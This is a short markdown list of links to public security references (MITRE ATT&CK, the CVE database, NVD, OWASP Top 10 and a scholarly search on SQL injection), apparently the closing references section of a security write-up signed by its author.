- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Adversarial tactics and techniques
- [CVE Database](https://cve.mitre.org/) - Common vulnerabilities and exposures
- [NVD](https://nvd.nist.gov/) - National Vulnerability Database
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web application risks
- [Security Research Papers](https://scholar.google.com/scholar?q=sql+injection+security) - Academic research

> Prepared by haseeb